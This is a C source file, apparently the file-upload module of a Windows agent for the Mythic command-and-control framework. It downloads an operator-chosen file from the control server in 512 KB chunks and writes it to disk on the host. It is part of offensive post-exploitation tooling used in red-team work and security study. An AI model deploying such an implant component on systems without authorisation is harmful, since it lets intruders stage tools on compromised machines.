#include "Tasks/Upload.h"

#include <windows.h>
#include "Parser.h"
#include "Package.h"
#include "Task.h"
#include "Config.h"

#ifdef INCLUDE_CMD_UPLOAD

#define CHUNK_SIZE  512000      // 512 KB


/**
 * @brief Retrieve file from Mythic in chunks.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] upload FILE_UPLOAD struct which contains details of a file
 * @return DWORD
 */
DWORD UploadChunked(_In_ PCHAR taskUuid, _Inout_ FILE_UPLOAD* upload)
{
    _dbg("Starting Chunked Upload...");

    DWORD Status = 0;

    upload->currentChunk = 1;

    do
    {
    /*
     * Prepare the package to request current chunk
     * - chunk_num
     * - file_id
     * - full_path
     * - chunk_size
    */
        PPackage data = PackageInit(UPLOAD_CHUNKED, TRUE);
        PackageAddString(data, taskUuid, FALSE);
        PackageAddInt32(data, upload->currentChunk);
        PackageAddBytes(data, upload->fileUuid, TASK_UUID_SIZE, FALSE);
        PackageAddString(data, upload->filepath, TRUE);
        PackageAddInt32(data, CHUNK_SIZE);

        // Send the package and receive the response
        PARSER Response = { 0 };
        PackageSend(data, &Response);
        PackageDestroy(data);

        BYTE success = ParserGetByte(&Response);
        if (success == FALSE)
        {
            _err("UploadChunked returned failure status for chunk %d.", upload->currentChunk);
            Status = ERROR_MYTHIC_UPLOAD;
            ParserDestroy(&Response);
            break;
        }
        
    /*
     * Response will ALWAYS hold data in the following order:
     * - File_id
     * - total_chunks
     * - chunk_num
     * - chunk_data
    */
        // Get file_id from response
        SIZE_T uuidLen  = TASK_UUID_SIZE;
        PCHAR fileUuid = ParserGetString(&Response, &uuidLen);
        if (fileUuid == NULL) 
        {
            _err("Failed to get UUID from response.");
            Status = ERROR_MYTHIC_UPLOAD;
            ParserDestroy(&Response);
            break;
        }
        
        // Copy file_id
        strncpy(upload->fileUuid, fileUuid, TASK_UUID_SIZE + 1);
        upload->fileUuid[TASK_UUID_SIZE + 1] = '\0';
        
        // Get total_chunks from response
        upload->totalChunks = ParserGetInt32(&Response);

        // Current chunk number retrieved
        upload->currentChunk = ParserGetInt32(&Response);

        // Get chunk data from the response
        SIZE_T bytesRead = 0;
        PBYTE chunk = ParserGetBytes(&Response, &bytesRead);
        if (!chunk)
        {
            _err("Failed to get chunk data for chunk %d.", upload->currentChunk);
            Status = ERROR_MYTHIC_UPLOAD;
            ParserDestroy(&Response);
            break;
        }

        _dbg("Received %d bytes for chunk %d.", bytesRead, upload->currentChunk);

        // Write chunk data to the file
        DWORD bytesWritten = 0;
        if (!WriteFile(upload->hFile, chunk, (DWORD)bytesRead, &bytesWritten, NULL))
        {
            DWORD error = GetLastError();
            _err("Failed to write to file. ERROR CODE: %d", error);
            Status = error;
            ParserDestroy(&Response);
            break;
        }

        if (bytesWritten != bytesRead)
        {
            _err("Incomplete write for chunk %d. Expected: %d, Written: %d", upload->currentChunk, bytesRead, bytesWritten);
            Status = ERROR_MYTHIC_UPLOAD;
            ParserDestroy(&Response);
            break;
        }

        // Clean up and prepare for the next chunk
        upload->currentChunk++;
        ParserDestroy(&Response);

    } while (upload->currentChunk <= upload->totalChunks);

    _dbg("Chunked upload complete. Total chunks processed: %d", upload->currentChunk - 1);

    return Status;
}


/**
 * @brief File upload via chunks
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] arguments PARSER struct containing task data.
 * @return VOID
 */
VOID Upload(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    UINT32 nbArg = ParserGetInt32(arguments);

    if (nbArg == 0)
    {
        return;
    }

    DWORD status;
    HANDLE hFile    = NULL;
    SIZE_T uuidLen  = 0;
    SIZE_T pathLen  = 0;

    FILE_UPLOAD upload  = { 0 };

    PCHAR fileUuid      = ParserGetString(arguments, &uuidLen);
    PCHAR uploadPath    = ParserGetString(arguments, &pathLen);

    // Need to get the file in chunks until finished now
    upload.hFile = CreateFileA(uploadPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (upload.hFile == INVALID_HANDLE_VALUE)
    {
        DWORD error = GetLastError();
        _err("Error opening file %s : ERROR CODE %d", uploadPath, error);
        PackageError(taskUuid, error);
        goto end;
    }

    strncpy(upload.filepath, uploadPath, pathLen);
    strncpy(upload.fileUuid, fileUuid, TASK_UUID_SIZE + 1);
    upload.fileUuid[TASK_UUID_SIZE + 1] = '\0';

    // Retrieve file in chunked sections
    status = UploadChunked(taskUuid, &upload);
    if ( status != 0 )
    {
        PackageError(taskUuid, status);
        goto end;
    }

    PackageComplete(taskUuid, NULL);

end:
    // Cleanup 
    if (upload.hFile) CloseHandle(upload.hFile);

}

/**
 * @brief Thread entrypoint for Upload function. 
 * 
 * @param[in] lpTaskParamter Structure that holds task related data (taskUuid, taskParser)
 * 
 * @return DWORD WINAPI
 */
DWORD WINAPI UploadThread(_In_ LPVOID lpTaskParamter)
{
    TASK_PARAMETER* tp = (TASK_PARAMETER*)lpTaskParamter;

    Upload(tp->TaskUuid, tp->TaskParser);
    
    _dbg("Upload Thread cleaning up now...");
    // Cleanup things used for thread
    free(tp->TaskUuid);
    ParserDestroy(tp->TaskParser);
    LocalFree(tp);  
    return 0;
}


#endif  //INCLUDE_CMD_UPLOAD